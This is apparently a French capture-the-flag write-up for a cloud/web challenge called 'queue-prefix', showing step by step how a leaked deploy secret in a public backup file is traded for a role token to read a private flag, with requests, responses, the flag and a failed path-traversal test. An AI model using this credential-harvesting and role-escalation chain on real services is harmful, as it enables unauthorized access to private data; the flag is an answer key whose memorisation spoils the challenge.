# queue-prefix (cloud / web, 415 pts)

**Flag :** `NCTF{bf59b6fe0352193940ea4062}`

## Service
API "queue-prefix" (racine `/`) :
- `/list?prefix=public/` — liste (uniquement le préfixe `public/`)
- `/get?key=...` — lit un objet (clés privées exigent `X-Role-Token`)
- `/assume?secret=...` — échange un secret contre un token de rôle

## Chaîne (préfixe public → credential fuité → escalade de rôle)
1. **Lister le préfixe public :**
   ```
   GET /list?prefix=public/
   → {"keys":["public/readme.txt","public/backup-notes.txt"]}
   ```
2. **Credential fuité** dans `public/backup-notes.txt` :
   ```
   GET /get?key=public/backup-notes.txt
   → deploy_secret=AKIA968662c57a798b61d30b
     # secret unlocks the backup-restore role (reads private/*)
   ```
3. **Escalade de rôle** via le secret :
   ```
   GET /assume?secret=AKIA968662c57a798b61d30b
   → {"role":"backup-restore","token":"role-zDLE8PC0XqI9V3HATg9lDXTeATw4l3W4"}
   ```
4. **Lecture du flag** (clé privée, avec le token) :
   ```
   GET /get?key=private/flag    (header: X-Role-Token: role-...)
   → {"body":"NCTF{bf59b6fe0352193940ea4062}","key":"private/flag"}
   ```

## Notes
- `/list` n'autorise que `public/` (403 sinon) → il faut deviner/obtenir la clé
  `private/flag` (nom logique après `private/*`).
- Path traversal via `/get?key=../...` testé : tout en 404, non nécessaire.
- « served by no route » = le flag n'est accessible par aucune route publique
  directe ; il faut la chaîne d'escalade complète.
